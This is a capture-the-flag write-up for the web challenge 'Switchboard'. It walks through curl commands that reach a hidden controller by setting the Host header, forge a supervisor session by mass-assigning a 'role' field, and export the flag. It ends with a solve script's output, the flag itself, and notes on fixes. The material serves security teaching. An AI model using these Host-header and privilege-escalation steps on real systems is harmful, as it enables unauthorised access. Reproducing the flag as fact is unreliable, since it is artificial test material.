---
tags: [web, ssrf, host-header, mass-assignment, session-forgery]
---

🇬🇧 English · [🇫🇷 Français](README.fr.md)

# Switchboard

| Category | Points | Solves | Solved | First blood | Solved by | Challenge author |
|---|---|---|---|---|---|---|
| web | 120 | 170 | ✅ | — | 0xAr3s-root | Iulian Schifirnet |

## Challenge description

> The Vardanne Joint Operations Directorate, coordinating Vardanne's part in the Operation
> Dawn coalition, runs an old voice exchange whose public board shows the state of its trunk
> circuits. The duty desk reaches a separate exchange controller over the internal trunk, and
> that controller can export the current trunk crypto key, but only to a rostered supervisor.
>
> Reach the controller and export the key. Start your own instance from this page and work
> only against the address it gives you.
>
> Flag format: `CSCTF{...}`

**Target:** a per-player instance at `http://w06.ctf.chronos-security.ro:<port>` (30-minute
TTL).

## TL;DR

The public line-status board and the "internal-only" exchange controller are served by the
**same backend on the same host:port**, routed purely by the `Host` header. Sending
`Host: exch-ctl.vjod.internal` — a hostname only disclosed, base64-encoded, in the public
board's JS — reaches the controller directly (an SSRF-equivalent bypass with no SSRF payload
needed, just a header). The controller's `POST /auth` accepts a client-supplied `role` field
and bakes it unchecked into the signed session cookie (mass assignment), so
`{"username": "x", "role": "supervisor"}` mints a supervisor session for free.
`GET /export/trunk-key` with that cookie returns the flag.

## Approach

**1. Recon — the public board**

```bash
curl -s http://w06.ctf.chronos-security.ro:34144/
```

A simple "Line status" dashboard for voice trunks, polling `GET /api/lines` every 30s.
Nothing obviously exploitable on the board itself (read-only JSON, no SSRF parameter). The
page footer mentions a "Service endpoints" block with an "Exchange controller" entry shown
as `checking…`, filled in by JS.

**2. The hostname leak in `switchboard.js`**

```bash
curl -s http://w06.ctf.chronos-security.ro:34144/static/switchboard.js
```

```js
// Exchange controller endpoint, as configured by the NOC. Shown for reference
// only; the browser cannot reach it from here (separate trunk, different host),
// so the live figures below are read from the public status API instead.
var controller = atob("ZXhjaC1jdGwudmpvZC5pbnRlcm5hbA==");
```

`atob("ZXhjaC1jdGwudmpvZC5pbnRlcm5hbA==")` → `exch-ctl.vjod.internal`. The comment insists
the *browser* can't reach it ("separate trunk, different host") — true for a client-side
fetch bound by the Same-Origin Policy and DNS, but says nothing about what happens if *we*,
as an HTTP client, simply ask the same server for that Host.

**3. Host-header routing = free SSRF**

```bash
curl -s http://w06.ctf.chronos-security.ro:34144/ \
  -H "Host: exch-ctl.vjod.internal"
```

This returns a *completely different application*: "Overview - Exchange controller",
"RESTRICTED · STAFF ONLY", with its own API table:

| Method | Path                 | Purpose                                      | Access            |
|--------|----------------------|-----------------------------------------------|-------------------|
| POST   | `/auth`              | Open an operator session. Body: `username`.    | internal trunk    |
| GET    | `/operators`         | Duty roster and your current session.          | operator session  |
| GET    | `/export/trunk-key`  | Export the current trunk crypto key.           | **supervisor**    |
| GET    | `/healthz`           | Liveness.                                      | any               |

The single backend process serves two logical sites and picks which one by matching the
`Host` header against `exch-ctl.vjod.internal` exactly — any other Host (including none, or
garbage) falls back to the public board. No separate "internal trunk" network isolation is
actually enforced; the "internal-only" claim is purely cosmetic.

**4. Trivial authentication, then mass assignment**

```bash
curl -s -X POST http://w06.ctf.chronos-security.ro:34144/auth \
  -H "Host: exch-ctl.vjod.internal" -H "Content-Type: application/json" \
  -d '{"username":"test"}'
# {"ok":true,"operator":"test","role":"operator"}
```

As documented, no password is asked. The returned `role` is always `"operator"` for a plain
username — until you notice the body is parsed permissively and a client-supplied `role`
field is accepted straight through:

```bash
curl -s -i -X POST http://w06.ctf.chronos-security.ro:34144/auth \
  -H "Host: exch-ctl.vjod.internal" -H "Content-Type: application/json" \
  -d '{"username":"test","role":"supervisor"}'
```

```
Set-Cookie: ctl_sid=eyJvcGVyYXRvciI6InRlc3QiLCJyb2xlIjoic3VwZXJ2aXNvciJ9.avB34w.Do2O... ; HttpOnly
{"ok":true,"operator":"test","role":"supervisor"}
```

The decoded cookie payload is simply `{"operator":"test","role":"supervisor"}` — the server
signs whatever role it's handed, it never derives it server-side from the roster
(`GET /operators` shows real supervisors like `R. Antonescu`/`EX-01`, but impersonating
their name or callsign still only yields `role: "operator"`; only sending the `role` field
itself works).

**5. Exporting the key**

```bash
curl -s http://w06.ctf.chronos-security.ro:34144/export/trunk-key \
  -H "Host: exch-ctl.vjod.internal" \
  -H "Cookie: ctl_sid=eyJvcGVyYXRvciI6InRlc3QiLCJyb2xlIjoic3VwZXJ2aXNvciJ9.avB34w.Do2OxQWWbZo5oKmOcimIHILssIY"
```

```json
{
  "algorithm": "AES-256-GCM",
  "exported_by": "test",
  "key_id": "KTK-2026-10-B",
  "trunk_key": "CSCTF{boqf6PlsFrpSSmqoJjq5FVlq}",
  "valid_from": "2026-11-08T13:17:57Z"
}
```

Solve script: [`solve/solve.py`](solve/solve.py)

```bash
python3 solve/solve.py http://w06.ctf.chronos-security.ro:34144
```

```
[+] Reaching internal controller via Host: exch-ctl.vjod.internal
[+] POST /auth -> {'ok': True, 'operator': 'ctf-player', 'role': 'supervisor'}
[+] Session cookie: ctl_sid=...
[+] GET /export/trunk-key -> { ... "trunk_key": "CSCTF{boqf6PlsFrpSSmqoJjq5FVlq}" ... }
[+] Flag: CSCTF{boqf6PlsFrpSSmqoJjq5FVlq}
```

## Flag

`CSCTF{boqf6PlsFrpSSmqoJjq5FVlq}`

## Reflections

- **Host-header-based "isolation" is not network isolation.** The challenge's flavour text
  ("the browser cannot reach it… separate trunk, different host") describes a *client-side*
  limitation (Same-Origin Policy / DNS resolution), not a server-side control. Any HTTP
  client that can set an arbitrary `Host` header defeats this instantly — this is the same
  class of bug as classic SSRF, except we don't even need the server to proxy a request for
  us: the "internal" app is reachable directly, on the exact same socket.
- **Never trust client-supplied fields that influence authorization**, especially when the
  field name matches an internal privilege concept 1:1 (`role`). The fix is to derive `role`
  purely server-side (from the authenticated identity against the roster, never from request
  body) and to never let request-body mass assignment reach security-sensitive session
  fields.
- Decoding the base64 "reference only" hostname was the real giveaway that the challenge
  wanted Host-header pivoting rather than, say, a literal SSRF parameter — when an app
  explains in a comment exactly *why* you supposedly can't reach something, that's worth
  testing from outside the browser's constraints.

## Tools & references

- `curl -H "Host: ..."` to reach a Host-header-routed vhost directly
- Mass assignment: [OWASP — Mass Assignment Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html)
- Host header attacks: [PortSwigger — HTTP Host header attacks](https://portswigger.net/web-security/host-header)

---
[⬅ Back to event](../../README.md)
